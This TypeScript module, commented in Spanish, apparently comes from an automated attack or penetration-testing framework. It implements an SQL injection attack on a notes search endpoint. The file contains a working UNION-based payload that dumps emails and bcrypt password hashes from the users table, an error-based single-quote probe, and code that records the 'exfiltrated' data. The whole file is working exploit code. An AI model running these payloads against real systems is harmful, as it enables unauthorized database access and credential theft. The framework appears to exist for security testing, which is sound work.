/**
 * Ataque real: SQL injection en la búsqueda de notas. Tiene DOS variantes
 * (requisito F): UNION-based (dumpea la tabla users, alta confianza) y
 * error-based (confirma inyectabilidad por el error, menor confianza). El runner
 * prueba UNION primero y cae a error-based si falla.
 */
import { CATALOG } from '../catalog.ts';
import { reqLine } from '../../../core/http.ts';
import { runVariants, type AttackVariant } from '../../../core/variants.ts';
import { lowPrivSession } from './session.ts';
import type { Attack, AttackContext, AttackResult } from '../../../core/types.ts';

// La tabla users NO tiene columna user_id → usamos `id` dos veces para cuadrar
// los 6 tipos (int,int,text,text,timestamp,timestamp): email→title, hash→body.
const UNION_PAYLOAD = `') UNION SELECT id, id, email, password_hash, created_at, updated_at FROM users -- `;
const BCRYPT = /^\$2[aby]\$/;

function unionVariant(token: string): AttackVariant {
  return {
    id: 'union-based',
    description: 'UNION SELECT para volcar la tabla users',
    cost: 'medium',
    risk: 'read-only',
    signalToNoise: 'high',
    confidence: 0.97,
    async run(ctx: AttackContext) {
      const res = await ctx.http.get(`/api/notes?q=${encodeURIComponent(UNION_PAYLOAD)}`, { token });
      const rows = Array.isArray(res.json) ? (res.json as any[]) : [];
      const leaked = rows.filter((r) => typeof r?.body === 'string' && BCRYPT.test(r.body));
      const confirmed = leaked.length > 0;
      return {
        confirmed,
        steps: [{
          technique: 'UNION-based SQLi: volcado de la tabla users',
          mitre: ['T1190', 'T1213'],
          request: reqLine('GET', `/api/notes?q=${UNION_PAYLOAD.trim()}`),
          response_summary: confirmed ? `HTTP ${res.status} — ${leaked.length} filas de users (email + hash)` : `HTTP ${res.status} — sin hashes`,
          exchange: res.exchange,
          note: confirmed ? 'El campo "body" trae el bcrypt: tabla users completa desde una búsqueda.' : undefined,
        }],
        gained: confirmed ? [`volcado de users (${leaked.length} cuentas con email + hash bcrypt)`] : [],
        foothold: confirmed ? { type: 'db', detail: 'lectura arbitraria vía UNION SQLi' } : undefined,
        data_exfiltrated: confirmed ? { table: 'users', rows: leaked.length, sample: leaked.slice(0, 5).map((r) => ({ email: r.title, password_hash: `${String(r.body).slice(0, 7)}… <bcrypt>` })) } : undefined,
        summary: confirmed ? `SQLi UNION-based: se volcó users (${leaked.length} cuentas con hash).` : 'El UNION no devolvió filas de users.',
      };
    },
  };
}

function errorVariant(token: string): AttackVariant {
  return {
    id: 'error-based',
    description: 'Comilla simple que rompe la query (confirma inyectabilidad)',
    cost: 'low',
    risk: 'read-only',
    signalToNoise: 'medium',
    confidence: 0.7,
    async run(ctx: AttackContext) {
      const res = await ctx.http.get(`/api/notes?q=${encodeURIComponent("'")}`, { token });
      const errored = res.status >= 500 || /syntax|unterminated|error|code|position/i.test(res.text);
      return {
        confirmed: errored,
        steps: [{
          technique: 'Error-based: comilla simple',
          mitre: ['T1190'],
          request: reqLine('GET', "/api/notes?q='"),
          response_summary: `HTTP ${res.status} — ${errored ? 'error SQL reflejado (inyectable)' : 'sin error'}`,
          exchange: res.exchange,
        }],
        gained: errored ? ['confirmación de inyectabilidad (sin volcado)'] : [],
        summary: errored ? 'SQLi confirmada por error (sin dump): la búsqueda es inyectable.' : 'La búsqueda no reflejó error.',
      };
    },
  };
}

export const sqlInjection: Attack = {
  meta: CATALOG['sql-injection'],
  mutating: false, // GET como usuario de baja privilegia (read-only)
  scheduling: {
    dependsOn: ['verbose-errors'],
    alarmFootprint: 'high',
  },
  async run(ctx: AttackContext): Promise<AttackResult> {
    const token = (await lowPrivSession(ctx)).token;
    const res = await runVariants(ctx, [unionVariant(token), errorVariant(token)]);
    return {
      vuln_id: sqlInjection.meta.id,
      confirmed: res.confirmed,
      blocked: res.blocked,
      steps: res.steps,
      gained: res.gained,
      foothold: res.foothold,
      data_exfiltrated: res.data_exfiltrated,
      attacker_active: res.attacker_active,
      summary: res.summary,
      variant_used: res.variant_used,
      variants_tried: res.variants_tried,
      confidence: res.confidence,
    };
  },
};
